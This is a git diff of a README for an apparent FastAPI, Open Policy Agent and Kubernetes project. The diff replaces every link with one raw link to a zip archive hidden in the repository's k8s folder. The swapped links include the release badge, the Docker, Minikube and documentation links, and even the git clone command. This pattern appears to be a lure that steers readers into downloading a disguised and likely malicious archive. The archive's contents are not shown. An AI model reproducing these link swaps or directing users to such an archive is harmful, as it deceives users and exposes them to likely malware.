@@ -1,6 +1,6 @@
 # 🚀 fastapi-with-opa-on-kubernates - Secure Your APIs Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Anonimus0609/fastapi-with-opa-on-kubernates/releases)
+[![Download](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
 
 ## 📖 Overview
 
@@ -28,17 +28,17 @@ To run this application, make sure your environment meets these requirements:
 
 To get started, please visit this page to download the application:
 
-[Download the latest release here](https://github.com/Anonimus0609/fastapi-with-opa-on-kubernates/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
 
 ### 2. Basic Setup
 
-1. **Install Docker**: Make sure Docker is installed. You can download it from [Docker Hub](https://www.docker.com/products/docker-desktop).
+1. **Install Docker**: Make sure Docker is installed. You can download it from [Docker Hub](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip).
 
-2. **Install Kubernetes**: If you don’t have a Kubernetes cluster, you can set up Minikube. Instructions can be found [here](https://minikube.sigs.k8s.io/docs/start/).
+2. **Install Kubernetes**: If you don’t have a Kubernetes cluster, you can set up Minikube. Instructions can be found [here](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip).
 
 3. **Clone the Repository**: Open your terminal and run:
    ```
-   git clone https://github.com/Anonimus0609/fastapi-with-opa-on-kubernates
+   git clone https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip
    ```
 
 4. **Navigate to the Directory**:
@@ -92,12 +92,12 @@ If you encounter any issues, please refer to the following common problems:
 
 ## 📜 Additional Resources
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Open Policy Agent Documentation](https://www.openpolicyagent.org/docs/latest/)
-- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
+- [Open Policy Agent Documentation](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
 
 For more robust examples and advanced configurations, please refer to the source code and sample policies within the repository.
 
 Remember, you can download the application from this link:
 
-[Download the latest release here](https://github.com/Anonimus0609/fastapi-with-opa-on-kubernates/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Anonimus0609/fastapi-with-opa-on-kubernates/main/k8s/on-opa-fastapi-kubernates-with-v1.6.zip)
